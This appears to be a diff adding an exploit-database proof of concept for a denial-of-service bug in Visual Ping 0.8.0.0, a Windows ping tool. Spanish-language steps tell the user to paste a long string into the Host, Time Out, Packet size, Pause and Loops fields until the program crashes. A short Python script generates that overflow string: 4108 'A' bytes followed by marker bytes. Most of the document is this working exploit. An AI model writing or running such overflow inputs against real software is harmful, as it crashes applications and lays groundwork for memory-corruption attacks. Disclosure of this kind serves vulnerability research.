@@ -1,0 +1,29 @@
+# Exploit Title: Visual Ping 0.8.0.0 - 'Host' Denial of Service (PoC)
+# Date: 2018-08-30
+# Exploit Author: Uriel Corral Salinas
+# Vendor Homepage: http://www.itlights.com
+# Software Link: http://www.scanwith.com/download/Free_Visual_Ping.htm
+# Version: Free Visual Ping  (Version 0.8.0.0)
+# Tested on: Windows 10 Pro x64
+
+# Visual Ping 0.8.0.0 - 'Host, Time Out,packet size, Pause, Loops' - Denial of Service (PoC)
+# 1. Ejecutar codigo "Visual_Ping.py"
+# 2. Copiar contenido de "VisualPing.txt" al portapapeles
+# 3. Ejecutar VPing.exe
+# 4. Copiar portapapeles en Host
+# 5. Copiar portapapeles en Time Out
+# 6. Copiar portapapeles en Packet size
+# 7. Copiar portapapeles en Pause
+# 8. Copiar portapapeles en Loops
+# 9. Click en Star
+# 10. Crashed
+
+#!/usr/bin/env python
+
+f=open("VisualPing.txt","w")
+buff = "\x41" * 4108
+ggg = "\x42" * 4
+hhh = "\x43" * 4
+iii = "\x44" * 4
+f.write(buff + ggg + hhh + iii)
+f.close()
